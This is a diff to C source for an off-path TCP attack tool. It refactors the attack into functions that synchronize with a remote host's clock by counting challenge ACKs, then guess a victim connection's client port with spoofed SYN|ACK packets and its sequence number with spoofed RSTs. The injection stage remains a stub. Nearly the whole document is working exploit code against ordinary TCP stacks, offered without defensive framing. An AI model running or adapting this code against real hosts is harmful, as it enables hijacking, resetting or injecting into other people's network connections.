@@ -45,15 +45,12 @@
 #include "router.h"
 
 
-/* attack state tracking */
-typedef enum {
-	AS_SYNC = 0,
-	AS_TUPLE_INFERENCE,
-	AS_SEQ_INFERENCE,
-	AS_ACK_INFERENCE,
-	AS_INJECTION,
-	AS_SUCCESS
-} astate_t;
+/*
+ * if DEVICE is not defined, we'll try to find a suitable device..
+ */
+// #define DEVICE "ppp0"
+#define SNAPLEN 1500
+
 
 /* TCP connection tracking */
 typedef enum {
@@ -94,16 +91,13 @@ typedef struct thctx_struct {
 	uint16_t winsz; // initial TCP window size
 } thctx_t;
 
+
 /* global count for challenge ACKs received in one period */
 static volatile int g_chack_cnt = 0;
 /* global context for threads operating on pkts */
 static volatile thctx_t g_ctx;
-
-/*
- * if DEVICE is not defined, we'll try to find a suitable device..
- */
-// #define DEVICE "ppp0"
-#define SNAPLEN 1500
+/* global RST packet for eliciting challenge ACKs */
+static packet_t g_rst_pkt;
 
 
 /* prototypes.. */
@@ -385,6 +379,335 @@ int prepare_rst_packet(packet_t *ppkt)
 
 
 /*
+ * wait until the specified amount of time has elapsed
+ */
+void wait_until(const char *desc, struct timeval *pstart, time_t sec, suseconds_t usec)
+{
+	struct timeval now, diff;
+
+	/* sanity check that we didn't already reach it! */
+	gettimeofday(&now, NULL);
+	timersub(&now, pstart, &diff);
+	if ((sec != 0 && usec != 0)
+			|| (sec > 0 && diff.tv_sec >= sec)
+			|| (usec > 0 && diff.tv_usec >= usec)) {
+		fprintf(stderr, "[!] %s : bad usage or already reached time (%lu %lu)!!\n",
+				desc, diff.tv_sec, diff.tv_usec);
+		exit(1); // EWW
+	}
+
+	for (;;) {
+		usleep(250);
+		gettimeofday(&now, NULL);
+		timersub(&now, pstart, &diff);
+		if (sec > 0 && diff.tv_sec >= sec)
+			break;
+		if (usec > 0 && diff.tv_usec >= usec)
+			break;
+	}
+#ifdef DEBUG_WAIT_UNTIL
+	printf("    %s took %lu %lu\n", desc, diff.tv_sec, diff.tv_usec);
+#endif
+}
+
+
+/*
+ * stage 1 - time synchronization
+ *
+ * 1. send 200 in-window RSTs spaced evenly
+ * 2. count the challenge ACKs returned
+ * 3. adjust accordingly
+ * 4. confirm
+ *
+ * the goal is exactly 100 challenge ACKs received...
+ */
+int sync_time_with_remote(void)
+{
+	int attempts = 0, round = 0, chack_cnt[4] = { 0 };
+	struct timeval round_start, start, now;
+#ifdef DEBUG_SYNC_SEND_TIME
+	struct timeval diff;
+#endif
+
+	/* if we don't synchronize within 3 attempts, give up.. */
+	while (1) {
+		gettimeofday(&round_start, NULL);
+
+		/* sanity check to detect really bad situations... */
+		if (g_chack_cnt > 0) {
+			fprintf(stderr, "[!] WTF? already received challenge ACKs??\n");
+			return 0;
+		}
+
+		/* send 200 RSTs, spaced evenly */
+		if (!send_packets_delay(&g_rst_pkt, 200, 5000))
+			return 0;
+		gettimeofday(&now, NULL);
+#ifdef DEBUG_SYNC_SEND_TIME
+		timersub(&now, &round_start, &diff);
+		printf("  send took %lu %lu\n", diff.tv_sec, diff.tv_usec);
+#endif
+
+		/* wait for 2 seconds for challenge ACKs... */
+		wait_until("time-sync recv", &round_start, 2, 0);
+
+		/* the delay before next round starts here.. */
+		memcpy(&start, &now, sizeof(start));
+
+		/* record the number of challenge acks seen */
+		chack_cnt[round] = g_chack_cnt;
+		g_chack_cnt = 0;
+
+		printf("[*] time-sync: round %d - %d challenge ACKs\n", round + 1, chack_cnt[round]);
+
+		/* did we sync?? */
+		if (chack_cnt[round] == 100) {
+			if (round == 2) {
+				/* verify... */
+				round++;
+				continue;
+			}
+			else if (round == 3) {
+				/* verified! */
+				printf("[*] Time synchronization complete!\n");
+				return 1;
+			}
+
+			/* we got luck! verify... */
+			round = 2;
+			continue;
+		}
+
+		else if (chack_cnt[round] < 100) {
+			fprintf(stderr, "[!] invalid number of challenge ACKs! WTF?\n");
+			return 0;
+		}
+
+		/* not sync'd yet, decide how much to delay */
+		else if (round < 2) {
+			/* round 1 -> round 2 : delay by 5ms */
+			uint64_t delay = 5000;
+
+			if (round == 1) {
+				/* round 2 -> round 3 : delay precisely */
+				if (chack_cnt[round] >= chack_cnt[0]) {
+					delay = (300 - chack_cnt[round]) * 5000;
+				} else {
+					delay = (chack_cnt[round] - 100) * 5000;
+				}
+			}
+
+			/* do the delay! */
+#ifdef DEBUG_SYNC_DELAY
+			printf("    delaying for %lu us\n", delay);
+#endif
+			wait_until("time-sync delay", &start, 0, delay);
+			round++;
+		} else {
+			/* start over :-/ */
+			attempts++;
+			if (attempts > 2) {
+				fprintf(stderr, "[!] maximum attempts reached! giving up.\n");
+				break;
+			}
+			fprintf(stderr, "[!] reached round %d without success, restarting...\n", round + 1);
+			round = 0;
+		}
+	}
+
+	/* fail! */
+	return 0;
+}
+
+
+/* stage 2 - four tuple inference
+ *
+ * send a spoofed SYN|ACK to try to elicit a challenge ACK for the purported
+ * connection from our victim.
+ */
+int infer_four_tuple(void)
+{
+	struct timeval round_start;
+#ifdef DEBUG_TUPLE_INFER_SPOOF_SEND
+	struct timeval now, diff;
+#endif
+	volatile conn_t *spoof = &(g_ctx.conn_spoof);
+	uint16_t guess_start = 0, guess_end = 0, guess_mid = 0;
+
+	while (1) {
+		gettimeofday(&round_start, NULL);
+
+		/* sanity check to detect really bad situations... */
+		if (g_chack_cnt > 0) {
+			fprintf(stderr, "[!] WTF? already received challenge ACKs??\n");
+			return 0;
+		}
+
+		/* if we need to initialize the ranges, do so now */
+		if (guess_mid == 0) {
+			/* if we already have a guess, try it first */
+			if (spoof->src->sin_port) {
+				/* if it hits, we set these equal to signify a win.
+				 *
+				 * we leave guess_mid set to 0 in case we missed..
+				 */
+				guess_start = guess_end = ntohs(spoof->src->sin_port);
+			}
+			/* no initial guess available... */
+			else {
+				/* initialize algorithm for port number checking
+				 * ... "the default range on Linux is only from 32768 to 61000"
+				 */
+				// XXX: TODO: scale number of guesses per round based on feedback
+				guess_start = 32768;
+				guess_end = 65535;
+			}
+		}
+
+		/* send the packet(s)! */
+		if (spoof->src->sin_port) {
+			if (!tcp_send(g_ctx.pch, spoof, TH_SYN|TH_ACK, NULL, 0))
+				return 0;
+			/* only send this once. */
+			spoof->src->sin_port = 0;
+		} else {
+			uint16_t guess;
+
+			guess_mid = ((uint32_t)guess_start + (uint32_t)guess_end) / 2;
+			for (guess = guess_mid; guess < guess_end; guess++) {
+				/* meh. we have to recalculate the TCP checksum to alter the source port */
+				spoof->src->sin_port = htons(guess);
+				if (!tcp_send(g_ctx.pch, spoof, TH_SYN|TH_ACK, NULL, 0))
+					return 0;
+			}
+			spoof->src->sin_port = 0;
+#ifdef DEBUG_TUPLE_INFER_SPOOF_SEND
+			gettimeofday(&now, NULL);
+			timersub(&now, &round_start, &diff);
+			printf("    sent %d spoofed SYN|ACK in %lu %lu\n", (int)(guess_end - guess_mid), diff.tv_sec, diff.tv_usec);
+#endif
+		}
+
+		/* send 100 RSTs */
+		if (!send_packets_delay(&g_rst_pkt, 100, 1000))
+			return 0;
+
+		/* get the number of challenge ACKs within this second */
+		wait_until("tuple-infer recv", &round_start, 1, 0);
+
+		printf("[*] tuple-infer: guessed port is in [%u - %u) (start: %u): %3d challenge ACKs - %s\n",
+				guess_mid, guess_end, guess_start,
+				g_chack_cnt, g_chack_cnt == 99 ? "OK" : "NO");
+
+		/* adjust the search based on the results */
+		if (g_chack_cnt == 100) {
+			/* if we exhausted the range and still didn't find it, start over */
+			if (guess_start >= guess_end) {
+				/* FAIL! */
+				printf("[!] Exhausted port search, starting over...\n");
+				guess_start = guess_end = guess_mid = 0;
+			}
+			else
+				/* adjust range */
+				guess_end = guess_mid - 1;
+		} else if (g_chack_cnt == 99) {
+			/* if we only sent one guess this time, we won! */
+			if (guess_start == guess_end) {
+				/* special handling for hinted guess */
+				printf("[*] Confirmed client port: %u\n", guess_start);
+				spoof->src->sin_port = ntohs(guess_start);
+				g_chack_cnt = 0;
+				return 1;
+			} else if (guess_end - guess_mid == 1) {
+				/* we legitimately guessed it! */
+				printf("[*] Guessed client port: %u\n", guess_mid);
+				spoof->src->sin_port = ntohs(guess_mid);
+				g_chack_cnt = 0;
+				return 1;
+			}
+			else
+				/* adjust range */
+				guess_start = guess_mid;
+		} else {
+			// XXX: TODO: scale number of guesses per round based on feedback
+			fprintf(stderr, "[!] invalid challenge ACK count! retrying range...\n");
+		}
+
+		g_chack_cnt = 0;
+	}
+
+	/* fail! */
+	return 0;
+}
+
+
+/*
+ * stage 3 - sequence number inference
+ *
+ * try to determine the victim's current sequence number
+ *
+ * we do this using an optimized approach breaking the search space
+ * into blocks based on the window size.
+ */
+int infer_sequence_number(void)
+{
+	struct timeval round_start, now, diff;
+	volatile conn_t *spoof = &(g_ctx.conn_spoof);
+	uint32_t seq_nblocks = UINT32_MAX / g_ctx.winsz;
+	uint32_t seq_block = 0, seq_last_block = 0;
+
+	while (1) {
+		gettimeofday(&round_start, NULL);
+
+		/* remember which block we started with */
+		seq_last_block = seq_block;
+
+		/* send sequence number guesses with a cap on both time and number of
+		 * guesses...
+		 */
+		do {
+			/* meh. we have to recalculate the TCP checksum to alter the sequence number */
+			spoof->seq = seq_block * g_ctx.winsz;
+			if (!tcp_send(g_ctx.pch, spoof, TH_RST, NULL, 0))
+				return 0;
+
+			/* limit the amount of time we try to send guesses */
+			gettimeofday(&now, NULL);
+			timersub(&now, &round_start, &diff);
+
+			seq_block++;
+			if (seq_block == seq_nblocks)
+				break;
+			if (seq_block - seq_last_block >= 50000)
+				break;
+		} while (diff.tv_usec < 500000);
+
+		printf("[*] seq-infer: spoofed %d RSTs in %lu %lu\n", (int)(seq_block - seq_last_block), diff.tv_sec, diff.tv_usec);
+
+		/* send 100 RSTs */
+		if (!send_packets_delay(&g_rst_pkt, 100, 1000))
+			return 0;
+
+		/* get the number of challenge ACKs within this second */
+		wait_until("seq-infer recv", &round_start, 1, 0);
+
+		printf("[*] seq-infer: guessed seqs [%lu - %lu): %3d challenge ACKs - %s\n",
+				(u_long)seq_last_block * g_ctx.winsz, (u_long)seq_block * g_ctx.winsz,
+				g_chack_cnt, g_chack_cnt == 99 ? "OK" : "NO");
+
+		g_chack_cnt = 0;
+
+		/* did we finish? */
+		if (seq_block == seq_nblocks)
+			break;
+	}
+
+	/* fail! */
+	return 0;
+}
+
+
+/*
  * conduct the attack:
  * 1. synchronize with remote clock
  * 2. infer four-tuple
@@ -396,21 +719,10 @@ int prepare_rst_packet(packet_t *ppkt)
  */
 int conduct_offpath_attack(void)
 {
-	int chack_cnt[4] = { 0 };
-	int round = 0;
-	packet_t rst_pkt;
 	pthread_t rth;
-	struct timeval start, now, diff;
-	astate_t attack_state = AS_SYNC;
-	volatile conn_t *spoof;
-	uint16_t guess_start = 0, guess_end = 0, guess_mid = 0;
-	uint32_t seq_nblocks = UINT32_MAX / g_ctx.winsz;
-	uint32_t seq_block = 0, seq_last_block = 0;
-
-	spoof = &(g_ctx.conn_spoof);
 
 	/* generate the packet we'll send over and over to elicit challenge ACKs */
-	if (!prepare_rst_packet(&rst_pkt))
+	if (!prepare_rst_packet(&g_rst_pkt))
 		return 0;
 
 	/* spawn the recv thread. it will live throughout the attack process... */
@@ -419,291 +731,23 @@ int conduct_offpath_attack(void)
 		return 0;
 	}
 
-	while (attack_state != AS_SUCCESS) {
-		struct timeval round_start;
+	/* synchronize our processing with the remote host's clock */
+	if (!sync_time_with_remote())
+		return 0;
 
-		gettimeofday(&round_start, NULL);
+	/* figure out the target connection's source port number */
+	if (!infer_four_tuple())
+		return 0;
 
-		if (g_chack_cnt > 0) {
-			fprintf(stderr, "[!] WTF? already received challenge ACKs??\n");
-			return 0;
-		}
+	/* figure out the target connection's sequence number */
+	if (!infer_sequence_number())
+		return 0;
 
-		/* stage 1 */
-		if (attack_state == AS_SYNC) {
-			/*
-			 * 1. send 200 in-window RSTs spaced evenly
-			 * 2. count the challenge ACKs returned
-			 * 3. adjust accordingly
-			 * 4. confirm
-			 *
-			 * the goal is exactly 100 challenge ACKs received...
-			 */
-			if (!send_packets_delay(&rst_pkt, 200, 5000))
-				return 0;
-#ifdef DEBUG_SEND_TIME
-			gettimeofday(&now, NULL);
-			timersub(&now, &round_start, &diff);
-			printf("  send took %lu %lu\n", diff.tv_sec, diff.tv_usec);
+#if 0
+	// ack number?
+
+	// inject some stuff?
 #endif
-
-			/* wait for 2 seconds for challenge ACKs... */
-			do {
-				usleep(250);
-				gettimeofday(&now, NULL);
-				timersub(&now, &round_start, &diff);
-			} while (diff.tv_sec < 2);
-#ifdef DEBUG_RECV_TIME
-			printf("  recv took %lu %lu\n", diff.tv_sec, diff.tv_usec);
-#endif
-
-			/* the delay before next round starts here.. */
-			memcpy(&start, &now, sizeof(start));
-
-			chack_cnt[round] = g_chack_cnt;
-			g_chack_cnt = 0;
-			printf("[*] time-sync: round %d - %d challenge ACKs\n", round + 1, chack_cnt[round]);
-
-			/* did we sync?? */
-			if (chack_cnt[round] == 100) {
-				if (round == 2) {
-					/* verify... */
-					round++;
-					continue;
-				}
-				else if (round == 3) {
-					/* verified! */
-					printf("[*] Time synchronization complete!\n");
-					attack_state = AS_TUPLE_INFERENCE;
-					continue;
-				}
-
-				/* we got luck! verify... */
-				round = 2;
-				continue;
-			}
-
-			else if (chack_cnt[round] < 100) {
-				fprintf(stderr, "[!] invalid number of challenge ACKs! WTF?\n");
-				return 0;
-			}
-
-			/* woot! */
-			else if (round < 2) {
-				/* round 1 -> round 2 : delay by 5ms */
-				uint64_t delay = 5000;
-
-				if (round == 1) {
-					/* round 2 -> round 3 : delay precisely */
-					if (chack_cnt[round] >= chack_cnt[0]) {
-						delay = (300 - chack_cnt[round]) * 5000;
-					} else {
-						delay = (chack_cnt[round] - 100) * 5000;
-					}
-				}
-
-				/* do the delay! */
-#ifdef DEBUG_DELAY
-				printf("    delaying for %lu us\n", delay);
-#endif
-				do {
-					usleep(250);
-					gettimeofday(&now, NULL);
-					timersub(&now, &start, &diff);
-#ifdef DEBUG_DELAY
-					printf("    delay progress %lu %lu\n", diff.tv_sec, diff.tv_usec);
-#endif
-				} while ((uint64_t)diff.tv_usec < delay);
-#ifdef DEBUG_DELAY
-				printf("    delay finished %lu %lu\n", diff.tv_sec, diff.tv_usec);
-#endif
-				round++;
-			} else {
-				/* start over :-/ */
-				fprintf(stderr, "[!] reached round %d without success, restarting...\n", round + 1);
-				round = 0;
-			}
-
-		/* stage 2 */
-		} else if (attack_state == AS_TUPLE_INFERENCE) {
-			/*
-			 * send a SYN|ACK to try to elicit a challenge ACK for the
-			 * purported connection from our victim.
-			 */
-
-			/* if we need to initialize the ranges, do so now */
-			if (guess_mid == 0) {
-				/* if we already have a guess, try it first */
-				if (spoof->src->sin_port) {
-					/* if it hits, we set these equal to signify a win.
-					 *
-					 * we leave guess_mid set to 0 in case we missed..
-					 */
-					guess_start = guess_end = ntohs(spoof->src->sin_port);
-				}
-				/* no initial guess available... */
-				else {
-					/* initialize algorithm for port number checking
-					 * ... "the default range on Linux is only from 32768 to 61000"
-					 */
-					// XXX: TODO: scale number of guesses per round based on feedback
-					guess_start = 32768;
-					guess_end = 65535;
-				}
-			}
-
-			/* send the packet(s)! */
-			if (spoof->src->sin_port) {
-				if (!tcp_send(g_ctx.pch, spoof, TH_SYN|TH_ACK, NULL, 0))
-					return 0;
-				/* only send this once. */
-				spoof->src->sin_port = 0;
-			} else {
-				uint16_t guess;
-
-				guess_mid = ((uint32_t)guess_start + (uint32_t)guess_end) / 2;
-				for (guess = guess_mid; guess < guess_end; guess++) {
-					/* meh. we have to recalculate the TCP checksum to alter the source port */
-					spoof->src->sin_port = htons(guess);
-					if (!tcp_send(g_ctx.pch, spoof, TH_SYN|TH_ACK, NULL, 0))
-						return 0;
-				}
-				spoof->src->sin_port = 0;
-#ifdef DEBUG_SPOOF_SEND
-				gettimeofday(&now, NULL);
-				timersub(&now, &round_start, &diff);
-				printf("  spoof send took %lu %lu\n", diff.tv_sec, diff.tv_usec);
-#endif
-			}
-
-			/* send 100 RSTs */
-			if (!send_packets_delay(&rst_pkt, 100, 1000))
-				return 0;
-
-			/* check if total send time de-synchronized us */
-			gettimeofday(&now, NULL);
-			timersub(&now, &round_start, &diff);
-#ifdef DEBUG_SEND_TIME
-			printf("  entire send took %lu %lu\n", diff.tv_sec, diff.tv_usec);
-#endif
-			if (diff.tv_sec > 0) {
-				fprintf(stderr, "[!] OH NO! sending took too long!\n");
-				return 0;
-			}
-
-			/* get the number of challenge ACKs after 1 second */
-			do {
-				usleep(250);
-				gettimeofday(&now, NULL);
-				timersub(&now, &round_start, &diff);
-			} while (diff.tv_sec < 1);
-#ifdef DEBUG_RECV_TIME
-			printf("  recv took %lu %lu\n", diff.tv_sec, diff.tv_usec);
-#endif
-
-			printf("[*] tuple-infer: guessed port is in [%u - %u) (start: %u): %3d challenge ACKs - %s\n",
-					guess_mid, guess_end, guess_start,
-					g_chack_cnt, g_chack_cnt == 100 ? "NO" : "OK");
-
-			if (g_chack_cnt == 100) {
-				/* if we exhausted the range and still didn't find it, start over */
-				if (guess_start >= guess_end) {
-					/* FAIL! */
-					printf("[!] Exhausted port search, starting over...\n");
-					guess_start = guess_end = guess_mid = 0;
-				}
-				else
-					/* adjust range */
-					guess_end = guess_mid - 1;
-			} else if (g_chack_cnt == 99) {
-				/* if we only sent one guess this time, we won! */
-				if (guess_start == guess_end) {
-					/* special handling for hinted guess */
-					printf("[*] Guessed client port: %u\n", guess_start);
-					spoof->src->sin_port = ntohs(guess_start);
-					attack_state = AS_SEQ_INFERENCE;
-				} else if (guess_end - guess_mid == 1) {
-					/* we legitimately guessed it! */
-					printf("[*] Guessed client port: %u\n", guess_mid);
-					spoof->src->sin_port = ntohs(guess_mid);
-					attack_state = AS_SEQ_INFERENCE;
-				}
-				else
-					/* adjust range */
-					guess_start = guess_mid;
-			} else {
-				// XXX: TODO: scale number of guesses per round based on feedback
-				fprintf(stderr, "[!] invalid challenge ACK count! retrying range...\n");
-			}
-
-			g_chack_cnt = 0;
-		}
-
-		else if (attack_state == AS_SEQ_INFERENCE) {
-			/*
-			 * try to determine the victim's current sequence number
-			 *
-			 * we do this using an optimized approach breaking the search space
-			 * into blocks based on the window size.
-			 */
-
-			/* remember which block we started with */
-			seq_last_block = seq_block;
-			do {
-				/* meh. we have to recalculate the TCP checksum to alter the source port */
-				spoof->seq = seq_block * g_ctx.winsz;
-				if (!tcp_send(g_ctx.pch, spoof, TH_RST, NULL, 0))
-					return 0;
-
-				/* limit the amount of time we try to send guesses */
-				gettimeofday(&now, NULL);
-				timersub(&now, &round_start, &diff);
-
-				seq_block++;
-				if (seq_block == seq_nblocks)
-					break;
-				if (seq_block - seq_last_block >= 50000)
-					break;
-			} while (diff.tv_usec < 500000);
-
-			printf("[*] seq-infer: spoofed %d RSTs in %lu %lu\n", (int)(seq_block - seq_last_block), diff.tv_sec, diff.tv_usec);
-
-			/* send 100 RSTs */
-			if (!send_packets_delay(&rst_pkt, 100, 1000))
-				return 0;
-
-			/* check if total send time de-synchronized us */
-			gettimeofday(&now, NULL);
-			timersub(&now, &round_start, &diff);
-#ifdef DEBUG_SEND_TIME
-			printf("  entire send took %lu %lu\n", diff.tv_sec, diff.tv_usec);
-#endif
-			if (diff.tv_sec > 0) {
-				fprintf(stderr, "[!] OH NO! sending took too long!\n");
-				return 0;
-			}
-
-			/* get the number of challenge ACKs after 1 second */
-			do {
-				usleep(250);
-				gettimeofday(&now, NULL);
-				timersub(&now, &round_start, &diff);
-			} while (diff.tv_sec < 1);
-#ifdef DEBUG_RECV_TIME
-			printf("  recv took %lu %lu\n", diff.tv_sec, diff.tv_usec);
-#endif
-
-			printf("[*] seq-infer: guessed seqs [%lu - %lu): %3d challenge ACKs - %s\n",
-					(u_long)seq_last_block * g_ctx.winsz, (u_long)seq_block * g_ctx.winsz,
-					g_chack_cnt, g_chack_cnt == 100 ? "NO" : "OK");
-
-			g_chack_cnt = 0;
-
-			/* did we finish? */
-			if (seq_block == seq_nblocks)
-				break;
-		}
-	}
 
 	return 1;
 }
